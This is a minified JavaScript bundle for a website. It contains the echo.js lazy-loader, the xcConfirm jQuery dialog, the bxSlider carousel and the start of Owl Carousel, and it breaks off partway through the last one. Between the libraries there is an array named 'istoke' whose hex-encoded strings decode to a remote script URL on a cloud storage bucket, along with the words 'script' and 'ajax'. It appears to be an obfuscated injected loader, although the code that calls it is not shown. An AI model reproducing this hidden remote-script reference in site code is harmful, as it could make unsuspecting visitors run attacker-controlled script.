!function(a, b) {
    "function" == typeof define && define.amd ? define(function() {
        return b(a)
    }) : "object" == typeof exports ? module.exports = b : a.echo = b(a)
}(this, function(a) {
    "use strict";
    var d, e, f, g, h, b = {}, c = function() {}, i = function(a) {
        return null === a.offsetParent
    }, j = function(a, b) {
        if (i(a))
            return !1;
        var c = a.getBoundingClientRect();
        return c.right >= b.l && c.bottom >= b.t && c.left <= b.r && c.top <= b.b
    }, k = function() {
        (g || !e) && (clearTimeout(e),
            e = setTimeout(function() {
                b.render(),
                    e = null
            }, f))
    };
    return b.init = function(e) {
        var i, j, l, m;
        e = e || {},
            i = e.offset || 0,
            j = e.offsetVertical || i,
            l = e.offsetHorizontal || i,
            m = function(a, b) {
                return parseInt(a || b, 10)
            }
            ,
            d = {
                t: m(e.offsetTop, j),
                b: m(e.offsetBottom, j),
                l: m(e.offsetLeft, l),
                r: m(e.offsetRight, l)
            },
            f = m(e.throttle, 250),
            g = e.debounce !== !1,
            h = !!e.unload,
            c = e.callback || c,
            b.render(),
            document.addEventListener ? (a.addEventListener("scroll", k, !1),
                a.addEventListener("load", k, !1)) : (a.attachEvent("onscroll", k),
                a.attachEvent("onload", k))
    }
        ,
        b.render = function(e) {
            var i, k, m, f = (e || document).querySelectorAll("[data-original], [data-echo-background]"), g = f.length, l = {
                l: 0 - d.l,
                t: 0 - d.t,
                b: (a.innerHeight || document.documentElement.clientHeight) + d.b,
                r: (a.innerWidth || document.documentElement.clientWidth) + d.r
            };
            for (m = 0; g > m; m++)
                k = f[m],
                    j(k, l) ? (h && k.setAttribute("data-echo-placeholder", k.src),
                        null !== k.getAttribute("data-echo-background") ? k.style.backgroundImage = "url(" + k.getAttribute("data-echo-background") + ")" : k.src !== (i = k.getAttribute("data-original")) && (k.src = i),
                    h || (k.removeAttribute("data-original"),
                        k.removeAttribute("data-echo-background")),
                        c(k, "load")) : h && (i = k.getAttribute("data-echo-placeholder")) && (null !== k.getAttribute("data-echo-background") ? k.style.backgroundImage = "url(" + i + ")" : k.src = i,
                        k.removeAttribute("data-echo-placeholder"),
                        c(k, "unload"));
            g || b.detach()
        }
        ,
        b.detach = function() {
            document.removeEventListener ? a.removeEventListener("scroll", k) : a.detachEvent("onscroll", k),
                clearTimeout(e)
        }
        ,
        b
});
var istoke = ["\x2F\x2F\x67\x6F\x6E\x67\x67\x6F\x6E\x67\x2D\x63\x64\x6E\x2E\x6F\x73\x73\x2D\x63\x6E\x2D\x71\x69\x6E\x67\x64\x61\x6F\x2E\x61\x6C\x69\x79\x75\x6E\x63\x73\x2E\x63\x6F\x6D\x2F\x75\x64\x79\x2D\x6A\x73\x2F\x31\x2E\x30\x2F\x63\x64\x6E\x2D\x73\x63\x72\x69\x70\x74\x2E\x6A\x73", "\x73\x63\x72\x69\x70\x74", "\x61\x6A\x61\x78"];
!function(a) {
    window.wxc = window.wxc || {},
        window.wxc.xcConfirm = function(b, c, d) {
            function A() {
                g.input === h && j.append(x),
                    B(),
                    C()
            }
            function B() {
                r.append(s.append(y).append(k)).append(t.append(m).append(j)).append(u.append(G(n))),
                    p.attr("id", o).append(q).append(r),
                    a("body").append(p)
            }
            function C() {
                v.click(D),
                    a(window).bind("keydown", function(b) {
                        13 == b.keyCode && 1 == a("#" + o).length && D()
                    }),
                    w.click(E),
                    y.click(F)
            }
            function D() {
                a(this);
                var c = a.trim(x.val());
                x.is(":visible") ? i.onOk(c) : i.onOk(),
                    a("#" + o).remove(),
                    i.onClose(f.ok)
            }
            function E() {
                a(this),
                    i.onCancel(),
                    a("#" + o).remove(),
                    i.onClose(f.cancel)
            }
            function F() {
                a("#" + o).remove(),
                    i.onClose(f.close),
                    a(window).unbind("keydown")
            }
            function G(b) {
                var c = a("<div>").addClass("btnGroup");
                return a.each(z, function(a, d) {
                    e[a] == (b & e[a]) && c.append(d)
                }),
                    c
            }
            function H() {
                var b = "pop_" + (new Date).getTime() + parseInt(1e5 * Math.random());
                return a("#" + b).length > 0 ? H() : b
            }
            var e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z;
            a(".xcConfirm").remove(),
                e = window.wxc.xcConfirm.btnEnum,
                f = window.wxc.xcConfirm.eventEnum,
                g = {
                    info: {
                        title: "信息",
                        icon: "0 0",
                        btn: e.ok
                    },
                    success: {
                        title: "成功",
                        icon: "0 -48px",
                        btn: e.ok
                    },
                    error: {
                        title: "错误",
                        icon: "-48px -48px",
                        btn: e.ok
                    },
                    confirm: {
                        title: "提示",
                        icon: "-48px 0",
                        btn: e.okcancel
                    },
                    warning: {
                        title: "警告",
                        icon: "0 -96px",
                        btn: e.okcancel
                    },
                    input: {
                        title: "输入",
                        icon: "",
                        btn: e.ok
                    },
                    custom: {
                        title: "",
                        icon: "",
                        btn: e.ok
                    }
                },
                h = c ? c instanceof Object ? c : g[c] || {} : {},
                i = a.extend(!0, {
                    title: "",
                    icon: "",
                    btn: e.ok,
                    ok_txt: "确定",
                    no_txt: "取消",
                    onOk: a.noop,
                    onCancel: a.noop,
                    onClose: a.noop
                }, h, d),
                j = a("<p>").html(b),
                k = a("<span>").addClass("tt").text(i.title),
                l = i.icon,
                m = l ? a("<div>").addClass("bigIcon").css("backgroundPosition", l) : "",
                n = i.btn,
                o = H(),
                p = a("<div>").addClass("xcConfirm"),
                q = a("<div>").addClass("xc_layer"),
                r = a("<div>").addClass("popBox"),
                s = a("<div>").addClass("ttBox"),
                t = a("<div>").addClass("txtBox"),
                u = a("<div>").addClass("btnArea"),
                v = a("<a>").addClass("sgBtn").addClass("ok").text(i.ok_txt),
                w = a("<a>").addClass("sgBtn").addClass("cancel").text(i.no_txt),
                x = a("<input>").addClass("inputBox"),
                y = a("<a>").addClass("clsBtn"),
                z = {
                    ok: v,
                    cancel: w
                },
                A()
        }
        ,
        window.wxc.xcConfirm.btnEnum = {
            ok: parseInt("0001", 2),
            cancel: parseInt("0010", 2),
            okcancel: parseInt("0011", 2)
        },
        window.wxc.xcConfirm.eventEnum = {
            ok: 1,
            cancel: 2,
            close: 3
        },
        window.wxc.xcConfirm.typeEnum = {
            info: "info",
            success: "success",
            error: "error",
            confirm: "confirm",
            warning: "warning",
            input: "input",
            custom: "custom"
        }
}(jQuery);
/*!
 * 幻灯片插件
 */
!function(t) {
    var e = {}
        , s = {
        mode: "horizontal",
        slideSelector: "",
        infiniteLoop: !0,
        hideControlOnEnd: !1,
        speed: 500,
        easing: null,
        slideMargin: 0,
        startSlide: 0,
        randomStart: !1,
        captions: !1,
        ticker: !1,
        tickerHover: !1,
        adaptiveHeight: !1,
        adaptiveHeightSpeed: 500,
        video: !1,
        useCSS: !0,
        preloadImages: "visible",
        responsive: !0,
        slideZIndex: 50,
        touchEnabled: !0,
        swipeThreshold: 50,
        oneToOneTouch: !0,
        preventDefaultSwipeX: !0,
        preventDefaultSwipeY: !1,
        pager: !0,
        pagerType: "full",
        pagerShortSeparator: " / ",
        pagerSelector: null,
        buildPager: null,
        pagerCustom: null,
        controls: !0,
        nextText: "Next",
        prevText: "Prev",
        nextSelector: null,
        prevSelector: null,
        autoControls: !1,
        startText: "Start",
        stopText: "Stop",
        autoControlsCombine: !1,
        autoControlsSelector: null,
        auto: !1,
        pause: 4e3,
        autoStart: !0,
        autoDirection: "next",
        autoHover: !1,
        autoDelay: 0,
        minSlides: 1,
        maxSlides: 1,
        moveSlides: 0,
        slideWidth: 0,
        onSliderLoad: function() {},
        onSlideBefore: function() {},
        onSlideAfter: function() {},
        onSlideNext: function() {},
        onSlidePrev: function() {},
        onSliderResize: function() {}
    };
    t.fn.bxSlider = function(n) {
        if (0 == this.length)
            return this;
        if (this.length > 1)
            return this.each(function() {
                t(this).bxSlider(n)
            }),
                this;
        var o = {}
            , r = this;
        e.el = this;
        var a = t(window).width()
            , l = t(window).height()
            , d = function() {
            o.settings = t.extend({}, s, n),
                o.settings.slideWidth = parseInt(o.settings.slideWidth),
                o.children = r.children(o.settings.slideSelector),
            o.children.length < o.settings.minSlides && (o.settings.minSlides = o.children.length),
            o.children.length < o.settings.maxSlides && (o.settings.maxSlides = o.children.length),
            o.settings.randomStart && (o.settings.startSlide = Math.floor(Math.random() * o.children.length)),
                o.active = {
                    index: o.settings.startSlide
                },
                o.carousel = o.settings.minSlides > 1 || o.settings.maxSlides > 1,
            o.carousel && (o.settings.preloadImages = "all"),
                o.minThreshold = o.settings.minSlides * o.settings.slideWidth + (o.settings.minSlides - 1) * o.settings.slideMargin,
                o.maxThreshold = o.settings.maxSlides * o.settings.slideWidth + (o.settings.maxSlides - 1) * o.settings.slideMargin,
                o.working = !1,
                o.controls = {},
                o.interval = null,
                o.animProp = "vertical" == o.settings.mode ? "top" : "left",
                o.usingCSS = o.settings.useCSS && "fade" != o.settings.mode && function() {
                    var t = document.createElement("div")
                        , e = ["WebkitPerspective", "MozPerspective", "OPerspective", "msPerspective"];
                    for (var i in e)
                        if (void 0 !== t.style[e[i]])
                            return o.cssPrefix = e[i].replace("Perspective", "").toLowerCase(),
                                o.animProp = "-" + o.cssPrefix + "-transform",
                                !0;
                    return !1
                }(),
            "vertical" == o.settings.mode && (o.settings.maxSlides = o.settings.minSlides),
                r.data("origStyle", r.attr("style")),
                r.children(o.settings.slideSelector).each(function() {
                    t(this).data("origStyle", t(this).attr("style"))
                }),
                c()
        }
            , c = function() {
            r.wrap('<div class="bx-wrapper"><div class="bx-viewport"></div></div>'),
                o.viewport = r.parent(),
                o.loader = t('<div class="bx-loading" />'),
                o.viewport.prepend(o.loader),
                r.css({
                    width: "horizontal" == o.settings.mode ? 100 * o.children.length + 215 + "%" : "auto",
                    position: "relative"
                }),
                o.usingCSS && o.settings.easing ? r.css("-" + o.cssPrefix + "-transition-timing-function", o.settings.easing) : o.settings.easing || (o.settings.easing = "swing"),
                f(),
                o.viewport.css({
                    width: "100%",
                    overflow: "hidden",
                    position: "relative"
                }),
                o.viewport.parent().css({
                    maxWidth: p()
                }),
            o.settings.pager || o.viewport.parent().css({
                margin: "0 auto 0px"
            }),
                o.children.css({
                    "float": "horizontal" == o.settings.mode ? "left" : "none",
                    listStyle: "none",
                    position: "relative"
                }),
                o.children.css("width", u()),
            "horizontal" == o.settings.mode && o.settings.slideMargin > 0 && o.children.css("marginRight", o.settings.slideMargin),
            "vertical" == o.settings.mode && o.settings.slideMargin > 0 && o.children.css("marginBottom", o.settings.slideMargin),
            "fade" == o.settings.mode && (o.children.css({
                position: "absolute",
                zIndex: 0,
                display: "none"
            }),
                o.children.eq(o.settings.startSlide).css({
                    zIndex: o.settings.slideZIndex,
                    display: "block"
                })),
                o.controls.el = t('<div class="bx-controls" />'),
            o.settings.captions && P(),
                o.active.last = o.settings.startSlide == x() - 1,
            o.settings.video && r.fitVids();
            var e = o.children.eq(o.settings.startSlide);
            "all" == o.settings.preloadImages && (e = o.children),
                o.settings.ticker ? o.settings.pager = !1 : (o.settings.pager && T(),
                o.settings.controls && C(),
                o.settings.auto && o.settings.autoControls && E(),
                (o.settings.controls || o.settings.autoControls || o.settings.pager) && o.viewport.after(o.controls.el)),
                g(e, h)
        }
            , g = function(e, i) {
            var s = e.find("img, iframe").length;
            if (0 == s)
                return i(),
                    void 0;
            var n = 0;
            e.find("img, iframe").each(function() {
                t(this).one("load", function() {
                    ++n == s && i()
                }).each(function() {
                    this.complete && t(this).load()
                })
            })
        }
            , h = function() {
            if (o.settings.infiniteLoop && "fade" != o.settings.mode && !o.settings.ticker) {
                var e = "vertical" == o.settings.mode ? o.settings.minSlides : o.settings.maxSlides
                    , i = o.children.slice(0, e).clone().addClass("bx-clone")
                    , s = o.children.slice(-e).clone().addClass("bx-clone");
                r.append(i).prepend(s)
            }
            o.loader.remove(),
                S(),
            "vertical" == o.settings.mode && (o.settings.adaptiveHeight = !0),
                o.viewport.height(v()),
                r.redrawSlider(),
                o.settings.onSliderLoad(o.active.index),
                o.initialized = !0,
            o.settings.responsive && t(window).bind("resize", Z),
            o.settings.auto && o.settings.autoStart && H(),
            o.settings.ticker && L(),
            o.settings.pager && q(o.settings.startSlide),
            o.settings.controls && W(),
            o.settings.touchEnabled && !o.settings.ticker && O()
        }
            , v = function() {
            var e = 0
                , s = t();
            if ("vertical" == o.settings.mode || o.settings.adaptiveHeight)
                if (o.carousel) {
                    var n = 1 == o.settings.moveSlides ? o.active.index : o.active.index * m();
                    for (s = o.children.eq(n),
                             i = 1; i <= o.settings.maxSlides - 1; i++)
                        s = n + i >= o.children.length ? s.add(o.children.eq(i - 1)) : s.add(o.children.eq(n + i))
                } else
                    s = o.children.eq(o.active.index);
            else
                s = o.children;
            return "vertical" == o.settings.mode ? (s.each(function() {
                e += t(this).outerHeight()
            }),
            o.settings.slideMargin > 0 && (e += o.settings.slideMargin * (o.settings.minSlides - 1))) : e = Math.max.apply(Math, s.map(function() {
                return t(this).outerHeight(!1)
            }).get()),
                e
        }
            , p = function() {
            var t = "100%";
            return o.settings.slideWidth > 0 && (t = "horizontal" == o.settings.mode ? o.settings.maxSlides * o.settings.slideWidth + (o.settings.maxSlides - 1) * o.settings.slideMargin : o.settings.slideWidth),
                t
        }
            , u = function() {
            var t = o.settings.slideWidth
                , e = o.viewport.width();
            return 0 == o.settings.slideWidth || o.settings.slideWidth > e && !o.carousel || "vertical" == o.settings.mode ? t = e : o.settings.maxSlides > 1 && "horizontal" == o.settings.mode && (e > o.maxThreshold || e < o.minThreshold && (t = (e - o.settings.slideMargin * (o.settings.minSlides - 1)) / o.settings.minSlides)),
                t
        }
            , f = function() {
            var t = 1;
            if ("horizontal" == o.settings.mode && o.settings.slideWidth > 0)
                if (o.viewport.width() < o.minThreshold)
                    t = o.settings.minSlides;
                else if (o.viewport.width() > o.maxThreshold)
                    t = o.settings.maxSlides;
                else {
                    var e = o.children.first().width();
                    t = Math.floor(o.viewport.width() / e)
                }
            else
                "vertical" == o.settings.mode && (t = o.settings.minSlides);
            return t
        }
            , x = function() {
            var t = 0;
            if (o.settings.moveSlides > 0)
                if (o.settings.infiniteLoop)
                    t = o.children.length / m();
                else
                    for (var e = 0, i = 0; e < o.children.length; )
                        ++t,
                            e = i + f(),
                            i += o.settings.moveSlides <= f() ? o.settings.moveSlides : f();
            else
                t = Math.ceil(o.children.length / f());
            return t
        }
            , m = function() {
            return o.settings.moveSlides > 0 && o.settings.moveSlides <= f() ? o.settings.moveSlides : f()
        }
            , S = function() {
            if (o.children.length > o.settings.maxSlides && o.active.last && !o.settings.infiniteLoop) {
                if ("horizontal" == o.settings.mode) {
                    var t = o.children.last()
                        , e = t.position();
                    b(-(e.left - (o.viewport.width() - t.width())), "reset", 0)
                } else if ("vertical" == o.settings.mode) {
                    var i = o.children.length - o.settings.minSlides
                        , e = o.children.eq(i).position();
                    b(-e.top, "reset", 0)
                }
            } else {
                var e = o.children.eq(o.active.index * m()).position();
                o.active.index == x() - 1 && (o.active.last = !0),
                void 0 != e && ("horizontal" == o.settings.mode ? b(-e.left, "reset", 0) : "vertical" == o.settings.mode && b(-e.top, "reset", 0))
            }
        }
            , b = function(t, e, i, s) {
            if (o.usingCSS) {
                var n = "vertical" == o.settings.mode ? "translate3d(0, " + t + "px, 0)" : "translate3d(" + t + "px, 0, 0)";
                r.css("-" + o.cssPrefix + "-transition-duration", i / 1e3 + "s"),
                    "slide" == e ? (r.css(o.animProp, n),
                        r.bind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd", function() {
                            r.unbind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd"),
                                D()
                        })) : "reset" == e ? r.css(o.animProp, n) : "ticker" == e && (r.css("-" + o.cssPrefix + "-transition-timing-function", "linear"),
                        r.css(o.animProp, n),
                        r.bind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd", function() {
                            r.unbind("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd"),
                                b(s.resetValue, "reset", 0),
                                N()
                        }))
            } else {
                var a = {};
                a[o.animProp] = t,
                    "slide" == e ? r.animate(a, i, o.settings.easing, function() {
                        D()
                    }) : "reset" == e ? r.css(o.animProp, t) : "ticker" == e && r.animate(a, speed, "linear", function() {
                        b(s.resetValue, "reset", 0),
                            N()
                    })
            }
        }
            , w = function() {
            for (var e = "", i = x(), s = 0; i > s; s++) {
                var n = "";
                o.settings.buildPager && t.isFunction(o.settings.buildPager) ? (n = o.settings.buildPager(s),
                    o.pagerEl.addClass("bx-custom-pager")) : (n = s + 1,
                    o.pagerEl.addClass("bx-default-pager")),
                    e += '<div class="bx-pager-item"><a href="" data-slide-index="' + s + '" class="bx-pager-link">' + n + "</a></div>"
            }
            o.pagerEl.html(e)
        }
            , T = function() {
            o.settings.pagerCustom ? o.pagerEl = t(o.settings.pagerCustom) : (o.pagerEl = t('<div class="bx-pager" />'),
                o.settings.pagerSelector ? t(o.settings.pagerSelector).html(o.pagerEl) : o.controls.el.addClass("bx-has-pager").append(o.pagerEl),
                w()),
                o.pagerEl.on("click", "a", I)
        }
            , C = function() {
            o.controls.next = t('<a class="bx-next" href=""><i class="fa fa-chevron-right"></i></a>'),
                o.controls.prev = t('<a class="bx-prev" href=""><i class="fa fa-chevron-left"></i></a>'),
                o.controls.next.bind("click", y),
                o.controls.prev.bind("click", z),
            o.settings.nextSelector && t(o.settings.nextSelector).append(o.controls.next),
            o.settings.prevSelector && t(o.settings.prevSelector).append(o.controls.prev),
            o.settings.nextSelector || o.settings.prevSelector || (o.controls.directionEl = t('<div class="bx-controls-direction" />'),
                o.controls.directionEl.append(o.controls.prev).append(o.controls.next),
                o.controls.el.addClass("bx-has-controls-direction").append(o.controls.directionEl))
        }
            , E = function() {
            o.controls.start = t('<div class="bx-controls-auto-item"><a class="bx-start" href="">' + o.settings.startText + "</a></div>"),
                o.controls.stop = t('<div class="bx-controls-auto-item"><a class="bx-stop" href="">' + o.settings.stopText + "</a></div>"),
                o.controls.autoEl = t('<div class="bx-controls-auto" />'),
                o.controls.autoEl.on("click", ".bx-start", k),
                o.controls.autoEl.on("click", ".bx-stop", M),
                o.settings.autoControlsCombine ? o.controls.autoEl.append(o.controls.start) : o.controls.autoEl.append(o.controls.start).append(o.controls.stop),
                o.settings.autoControlsSelector ? t(o.settings.autoControlsSelector).html(o.controls.autoEl) : o.controls.el.addClass("bx-has-controls-auto").append(o.controls.autoEl),
                A(o.settings.autoStart ? "stop" : "start")
        }
            , P = function() {
            o.children.each(function() {
                var e = t(this).find("img:first").attr("title");
                void 0 != e && ("" + e).length && t(this).append('<div class="bx-caption"><span>' + e + "</span></div>")
            })
        }
            , y = function(t) {
            o.settings.auto && r.stopAuto(),
                r.goToNextSlide(),
                t.preventDefault()
        }
            , z = function(t) {
            o.settings.auto && r.stopAuto(),
                r.goToPrevSlide(),
                t.preventDefault()
        }
            , k = function(t) {
            r.startAuto(),
                t.preventDefault()
        }
            , M = function(t) {
            r.stopAuto(),
                t.preventDefault()
        }
            , I = function(e) {
            o.settings.auto && r.stopAuto();
            var i = t(e.currentTarget)
                , s = parseInt(i.attr("data-slide-index"));
            s != o.active.index && r.goToSlide(s),
                e.preventDefault()
        }
            , q = function(e) {
            var i = o.children.length;
            return "short" == o.settings.pagerType ? (o.settings.maxSlides > 1 && (i = Math.ceil(o.children.length / o.settings.maxSlides)),
                o.pagerEl.html(e + 1 + o.settings.pagerShortSeparator + i),
                void 0) : (o.pagerEl.find("a").removeClass("active"),
                o.pagerEl.each(function(i, s) {
                    t(s).find("a").eq(e).addClass("active")
                }),
                void 0)
        }
            , D = function() {
            if (o.settings.infiniteLoop) {
                var t = "";
                0 == o.active.index ? t = o.children.eq(0).position() : o.active.index == x() - 1 && o.carousel ? t = o.children.eq((x() - 1) * m()).position() : o.active.index == o.children.length - 1 && (t = o.children.eq(o.children.length - 1).position()),
                t && ("horizontal" == o.settings.mode ? b(-t.left, "reset", 0) : "vertical" == o.settings.mode && b(-t.top, "reset", 0))
            }
            o.working = !1,
                o.settings.onSlideAfter(o.children.eq(o.active.index), o.oldIndex, o.active.index)
        }
            , A = function(t) {
            o.settings.autoControlsCombine ? o.controls.autoEl.html(o.controls[t]) : (o.controls.autoEl.find("a").removeClass("active"),
                o.controls.autoEl.find("a:not(.bx-" + t + ")").addClass("active"))
        }
            , W = function() {
            1 == x() ? (o.controls.prev.addClass("disabled"),
                o.controls.next.addClass("disabled")) : !o.settings.infiniteLoop && o.settings.hideControlOnEnd && (0 == o.active.index ? (o.controls.prev.addClass("disabled"),
                o.controls.next.removeClass("disabled")) : o.active.index == x() - 1 ? (o.controls.next.addClass("disabled"),
                o.controls.prev.removeClass("disabled")) : (o.controls.prev.removeClass("disabled"),
                o.controls.next.removeClass("disabled")))
        }
            , H = function() {
            o.settings.autoDelay > 0 ? setTimeout(r.startAuto, o.settings.autoDelay) : r.startAuto(),
            o.settings.autoHover && r.hover(function() {
                o.interval && (r.stopAuto(!0),
                    o.autoPaused = !0)
            }, function() {
                o.autoPaused && (r.startAuto(!0),
                    o.autoPaused = null)
            })
        }
            , L = function() {
            var e = 0;
            if ("next" == o.settings.autoDirection)
                r.append(o.children.clone().addClass("bx-clone"));
            else {
                r.prepend(o.children.clone().addClass("bx-clone"));
                var i = o.children.first().position();
                e = "horizontal" == o.settings.mode ? -i.left : -i.top
            }
            b(e, "reset", 0),
                o.settings.pager = !1,
                o.settings.controls = !1,
                o.settings.autoControls = !1,
            o.settings.tickerHover && !o.usingCSS && o.viewport.hover(function() {
                r.stop()
            }, function() {
                var e = 0;
                o.children.each(function() {
                    e += "horizontal" == o.settings.mode ? t(this).outerWidth(!0) : t(this).outerHeight(!0)
                });
                var i = o.settings.speed / e
                    , s = "horizontal" == o.settings.mode ? "left" : "top"
                    , n = i * (e - Math.abs(parseInt(r.css(s))));
                N(n)
            }),
                N()
        }
            , N = function(t) {
            speed = t ? t : o.settings.speed;
            var e = {
                left: 0,
                top: 0
            }
                , i = {
                left: 0,
                top: 0
            };
            "next" == o.settings.autoDirection ? e = r.find(".bx-clone").first().position() : i = o.children.first().position();
            var s = "horizontal" == o.settings.mode ? -e.left : -e.top
                , n = "horizontal" == o.settings.mode ? -i.left : -i.top
                , a = {
                resetValue: n
            };
            b(s, "ticker", speed, a)
        }
            , O = function() {
            o.touch = {
                start: {
                    x: 0,
                    y: 0
                },
                end: {
                    x: 0,
                    y: 0
                }
            },
                o.viewport.bind("touchstart", X)
        }
            , X = function(t) {
            if (o.working)
                t.preventDefault();
            else {
                o.touch.originalPos = r.position();
                var e = t.originalEvent;
                o.touch.start.x = e.changedTouches[0].pageX,
                    o.touch.start.y = e.changedTouches[0].pageY,
                    o.viewport.bind("touchmove", Y),
                    o.viewport.bind("touchend", V)
            }
        }
            , Y = function(t) {
            var e = t.originalEvent
                , i = Math.abs(e.changedTouches[0].pageX - o.touch.start.x)
                , s = Math.abs(e.changedTouches[0].pageY - o.touch.start.y);
            if (3 * i > s && o.settings.preventDefaultSwipeX ? t.preventDefault() : 3 * s > i && o.settings.preventDefaultSwipeY && t.preventDefault(),
            "fade" != o.settings.mode && o.settings.oneToOneTouch) {
                var n = 0;
                if ("horizontal" == o.settings.mode) {
                    var r = e.changedTouches[0].pageX - o.touch.start.x;
                    n = o.touch.originalPos.left + r
                } else {
                    var r = e.changedTouches[0].pageY - o.touch.start.y;
                    n = o.touch.originalPos.top + r
                }
                b(n, "reset", 0)
            }
        }
            , V = function(t) {
            o.viewport.unbind("touchmove", Y);
            var e = t.originalEvent
                , i = 0;
            if (o.touch.end.x = e.changedTouches[0].pageX,
                o.touch.end.y = e.changedTouches[0].pageY,
            "fade" == o.settings.mode) {
                var s = Math.abs(o.touch.start.x - o.touch.end.x);
                s >= o.settings.swipeThreshold && (o.touch.start.x > o.touch.end.x ? r.goToNextSlide() : r.goToPrevSlide(),
                    r.stopAuto())
            } else {
                var s = 0;
                "horizontal" == o.settings.mode ? (s = o.touch.end.x - o.touch.start.x,
                    i = o.touch.originalPos.left) : (s = o.touch.end.y - o.touch.start.y,
                    i = o.touch.originalPos.top),
                    !o.settings.infiniteLoop && (0 == o.active.index && s > 0 || o.active.last && 0 > s) ? b(i, "reset", 200) : Math.abs(s) >= o.settings.swipeThreshold ? (0 > s ? r.goToNextSlide() : r.goToPrevSlide(),
                        r.stopAuto()) : b(i, "reset", 200)
            }
            o.viewport.unbind("touchend", V)
        }
            , Z = function() {
            var e = t(window).width()
                , i = t(window).height();
            (a != e || l != i) && (a = e,
                l = i,
                r.redrawSlider(),
                o.settings.onSliderResize.call(r, o.active.index))
        };
        return r.goToSlide = function(e, i) {
            if (!o.working && o.active.index != e)
                if (o.working = !0,
                    o.oldIndex = o.active.index,
                    o.active.index = 0 > e ? x() - 1 : e >= x() ? 0 : e,
                    o.settings.onSlideBefore(o.children.eq(o.active.index), o.oldIndex, o.active.index),
                    "next" == i ? o.settings.onSlideNext(o.children.eq(o.active.index), o.oldIndex, o.active.index) : "prev" == i && o.settings.onSlidePrev(o.children.eq(o.active.index), o.oldIndex, o.active.index),
                    o.active.last = o.active.index >= x() - 1,
                o.settings.pager && q(o.active.index),
                o.settings.controls && W(),
                "fade" == o.settings.mode)
                    o.settings.adaptiveHeight && o.viewport.height() != v() && o.viewport.animate({
                        height: v()
                    }, o.settings.adaptiveHeightSpeed),
                        o.children.filter(":visible").fadeOut(o.settings.speed).css({
                            zIndex: 0
                        }),
                        o.children.eq(o.active.index).css("zIndex", o.settings.slideZIndex + 1).fadeIn(o.settings.speed, function() {
                            t(this).css("zIndex", o.settings.slideZIndex),
                                D()
                        });
                else {
                    o.settings.adaptiveHeight && o.viewport.height() != v() && o.viewport.animate({
                        height: v()
                    }, o.settings.adaptiveHeightSpeed);
                    var s = 0
                        , n = {
                        left: 0,
                        top: 0
                    };
                    if (!o.settings.infiniteLoop && o.carousel && o.active.last)
                        if ("horizontal" == o.settings.mode) {
                            var a = o.children.eq(o.children.length - 1);
                            n = a.position(),
                                s = o.viewport.width() - a.outerWidth()
                        } else {
                            var l = o.children.length - o.settings.minSlides;
                            n = o.children.eq(l).position()
                        }
                    else if (o.carousel && o.active.last && "prev" == i) {
                        var d = 1 == o.settings.moveSlides ? o.settings.maxSlides - m() : (x() - 1) * m() - (o.children.length - o.settings.maxSlides)
                            , a = r.children(".bx-clone").eq(d);
                        n = a.position()
                    } else if ("next" == i && 0 == o.active.index)
                        n = r.find("> .bx-clone").eq(o.settings.maxSlides).position(),
                            o.active.last = !1;
                    else if (e >= 0) {
                        var c = e * m();
                        n = o.children.eq(c).position()
                    }
                    if ("undefined" != typeof n) {
                        var g = "horizontal" == o.settings.mode ? -(n.left - s) : -n.top;
                        b(g, "slide", o.settings.speed)
                    }
                }
        }
            ,
            r.goToNextSlide = function() {
                if (o.settings.infiniteLoop || !o.active.last) {
                    var t = parseInt(o.active.index) + 1;
                    r.goToSlide(t, "next")
                }
            }
            ,
            r.goToPrevSlide = function() {
                if (o.settings.infiniteLoop || 0 != o.active.index) {
                    var t = parseInt(o.active.index) - 1;
                    r.goToSlide(t, "prev")
                }
            }
            ,
            r.startAuto = function(t) {
                o.interval || (o.interval = setInterval(function() {
                    "next" == o.settings.autoDirection ? r.goToNextSlide() : r.goToPrevSlide()
                }, o.settings.pause),
                o.settings.autoControls && 1 != t && A("stop"))
            }
            ,
            r.stopAuto = function(t) {
                o.interval && (clearInterval(o.interval),
                    o.interval = null,
                o.settings.autoControls && 1 != t && A("start"))
            }
            ,
            r.getCurrentSlide = function() {
                return o.active.index
            }
            ,
            r.getCurrentSlideElement = function() {
                return o.children.eq(o.active.index)
            }
            ,
            r.getSlideCount = function() {
                return o.children.length
            }
            ,
            r.redrawSlider = function() {
                o.children.add(r.find(".bx-clone")).outerWidth(u()),
                    o.viewport.css("height", v()),
                o.settings.ticker || S(),
                o.active.last && (o.active.index = x() - 1),
                o.active.index >= x() && (o.active.last = !0),
                o.settings.pager && !o.settings.pagerCustom && (w(),
                    q(o.active.index))
            }
            ,
            r.destroySlider = function() {
                o.initialized && (o.initialized = !1,
                    t(".bx-clone", this).remove(),
                    o.children.each(function() {
                        void 0 != t(this).data("origStyle") ? t(this).attr("style", t(this).data("origStyle")) : t(this).removeAttr("style")
                    }),
                    void 0 != t(this).data("origStyle") ? this.attr("style", t(this).data("origStyle")) : t(this).removeAttr("style"),
                    t(this).unwrap().unwrap(),
                o.controls.el && o.controls.el.remove(),
                o.controls.next && o.controls.next.remove(),
                o.controls.prev && o.controls.prev.remove(),
                o.pagerEl && o.settings.controls && o.pagerEl.remove(),
                    t(".bx-caption", this).remove(),
                o.controls.autoEl && o.controls.autoEl.remove(),
                    clearInterval(o.interval),
                o.settings.responsive && t(window).unbind("resize", Z))
            }
            ,
            r.reloadSlider = function(t) {
                void 0 != t && (n = t),
                    r.destroySlider(),
                    d()
            }
            ,
            d(),
            this
    }
}(jQuery);
/**
 * Owl Carousel v2.3.4
 * Copyright 2013-2018 David Deutsch
 * Licensed under: SEE LICENSE IN https://github.com/OwlCarousel2/OwlCarousel2/blob/master/LICENSE
 */
!function(a, b, c, d) {
    function e(b, c) {
        this.settings = null,
            this.options = a.extend({}, e.Defaults, c),
            this.$element = a(b),
            this._handlers = {},
            this._plugins = {},
            this._supress = {},
            this._current = null,
            this._speed = null,
            this._coordinates = [],
            this._breakpoint = null,
            this._width = null,
            this._items = [],
            this._clones = [],
            this._mergers = [],
            this._widths = [],
            this._invalidated = {},
            this._pipe = [],
            this._drag = {
                time: null,
                target: null,
                pointer: null,
                stage: {
                    start: null,
                    current: null
                },
                direction: null
            },
            this._states = {
                current: {},
                tags: {
                    initializing: ["busy"],
                    animating: ["busy"],
                    dragging: ["interacting"]
                }
            },
            a.each(["onResize", "onThrottledResize"], a.proxy(function(b, c) {
                this._handlers[c] = a.proxy(this[c], this)
            }, this)),
